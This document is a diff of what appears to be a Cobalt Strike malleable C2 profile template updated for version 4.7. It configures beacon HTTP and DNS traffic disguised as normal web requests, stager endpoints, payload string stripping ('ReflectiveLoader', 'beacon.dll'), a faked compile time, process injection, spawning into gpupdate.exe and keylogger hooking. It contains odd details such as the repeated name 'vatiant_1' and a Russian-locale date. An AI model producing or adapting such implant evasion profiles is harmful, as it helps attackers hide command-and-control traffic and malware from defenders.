@@ -1,5 +1,5 @@
 #clean template profile - no comments, cleaned up, hopefully easier to build new profiles off of.
-#updated with 4.3 options
+#updated with 4.7 options
 #xx0hcd
 
 ###Global Options###
@@ -11,9 +11,30 @@ set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/587.38 (KHTML, like Geck
 set data_jitter "50";
 
 set host_stage "false";
+set headers_remove "Server,X-Forwarded-For";
 
 ###DNS options###
 dns-beacon {
+    # Options moved into 'dns-beacon' group in 4.3:
+    set dns_idle             "8.8.8.8";
+    set dns_max_txt          "220";
+    set dns_sleep            "0";
+    set dns_ttl              "1";
+    set maxdns               "255";
+    set dns_stager_prepend   ".wwwds.";
+    set dns_stager_subhost   ".e2867.dsca.";
+     
+    # DNS subhost override options added in 4.3:
+    set beacon               "d-bx.";
+    set get_A                "d-1ax.";
+    set get_AAAA             "d-4ax.";
+    set get_TXT              "d-1tx.";
+    set put_metadata         "d-1mx";
+    set put_output           "d-1ox.";
+    set ns_response          "zero";
+}
+
+dns-beacon "vatiant_1" {
     # Options moved into 'dns-beacon' group in 4.3:
     set dns_idle             "8.8.8.8";
     set dns_max_txt          "220";
@@ -94,22 +115,22 @@ http-get {
 
 	   
         metadata {
-        #base64
-        base64url;
-        #mask;
-        #netbios;
-        #netbiosu;
-        #prepend "TEST123";
-        append ".php";
+            #base64
+            base64url;
+            #mask;
+            #netbios;
+            #netbiosu;
+            #prepend "TEST123";
+            append ".php";
 
-        parameter "file";
-        #header "Cookie";
-        #uri-append;
+            parameter "file";
+            #header "Cookie";
+            #uri-append;
 
-        #print;
-    }
+            #print;
+        }
 
-    parameter "test1" "test2";
+        parameter "test1" "test2";
     }
 
     server {
@@ -123,9 +144,9 @@ http-get {
             #base64url;
             #mask;
             	       
-	    prepend "content=";
+            prepend "content=";
 
-	    append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
+            append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
 
             print;
         }
@@ -133,7 +154,7 @@ http-get {
 }
 
 ###HTTP-GET VARIANT###
-http-get "variant_name_get" {
+http-get "vatiant_1" {
 
     set uri "/uri1 /uri2 /uri3";
 
@@ -145,19 +166,19 @@ http-get "variant_name_get" {
         header "Connection" "close";
 
 	   
-    metadata {
+        metadata {
 
-        base64url;
-        append ".php";
+            base64url;
+            append ".php";
 
-        parameter "file";
-        #header "Cookie";
-        #uri-append;
+            parameter "file";
+            #header "Cookie";
+            #uri-append;
 
-        #print;
-    }
+            #print;
+        }
 
-    parameter "test1" "test2";
+        parameter "test1" "test2";
     }
 
     server {
@@ -190,12 +211,12 @@ http-post {
         
         output {
             base64url; 
-	    parameter "testParam";
+	        parameter "testParam";
         }
 
         id {
-	    base64url;
-	    parameter "id";
+            base64url;
+            parameter "id";
             #header "ID-Header";
 
         }
@@ -208,9 +229,9 @@ http-post {
         output {
             netbios;	    
 	   
-	    prepend "content=";
+	        prepend "content=";
 
-	    append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
+	        append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
 
             print;
         }
@@ -218,7 +239,7 @@ http-post {
 }
 
 ###HTTP-POST VARIANT###
-http-post "variant_name_post" {
+http-post "vatiant_1" {
     
     set uri "/Uri1 /Uri2 /Uri3";
     set verb "GET";
@@ -226,17 +247,17 @@ http-post "variant_name_post" {
 
     client {
 
-	header "Host" "whatever.com";
-	header "Connection" "close";     
+        header "Host" "whatever.com";
+        header "Connection" "close";     
         
         output {
             base64url; 
-	    parameter "testParam";
+	        parameter "testParam";
         }
 
         id {
-	    base64url;
-	    parameter "id";
+            base64url;
+            parameter "id";
 
         }
     }
@@ -247,9 +268,9 @@ http-post "variant_name_post" {
         output {
             netbios;	    
 	   
-	    prepend "content=";
+            prepend "content=";
 
-	    append "\n<meta name=\n";
+            append "\n<meta name=\n";
 
             print;
         }
@@ -272,13 +293,39 @@ http-stager {
     server {
         #header "Server" "nginx";
 	
-	output {
+        output {
+        
+            prepend "content=";
+            
+            append "</script>\n";
+            print;
+        }
+
+    }
+}
+
+http-stager "vatiant_1" {
+
+    set uri_x86 "/Console";
+    set uri_x64 "/console";
+
+    client {
+        header "Host" "whatever.com";
+        header "Connection" "close";
 	
-	    prepend "content=";
-	    
-	    append "</script>\n";
-	    print;
-	}
+	    parameter "test1" "test2";
+    }
+
+    server {
+        #header "Server" "nginx";
+	
+        output {
+        
+            prepend "content=";
+            
+            append "</script>\n";
+            print;
+        }
 
     }
 }
@@ -287,7 +334,7 @@ http-stager {
 ###Malleable PE/Stage Block###
 stage {
     set checksum        "0";
-    set compile_time    "25 Oct 2016 01:57:23";
+    set compile_time    "25 окт. 2016 01:57:23";
     set entry_point     "170000";
     #set image_size_x86 "6586368";
     #set image_size_x64 "6586368";
@@ -315,17 +362,17 @@ stage {
         prepend "\x90\x90\x90";
         strrep "ReflectiveLoader" "";
         strrep "beacon.dll" "";
-        }
+    }
 
     transform-x64 {
         prepend "\x90\x90\x90";
         strrep "ReflectiveLoader" "";
         strrep "beacon.x64.dll" "";
-        }
+    }
 
-    string "something";
-    data "something";
-    stringw "something"; 
+    data "something2";
+    string "something1";
+    stringw "something3"; 
 }
 
 ###Process Inject Block###
@@ -366,11 +413,10 @@ process-inject {
 
 ###Post-Ex Block###
 post-ex {
-
     set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
     set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";
 
-    set obfuscate "true";
+    set obfuscate "false";
 
     set smartinject "true";
 
@@ -380,5 +426,4 @@ post-ex {
     set thread_hint "ntdll.dll!RtlUserThreadStart";
     set pipename "DserNamePipe##";
     set keylogger "SetWindowsHookEx";
-
 }
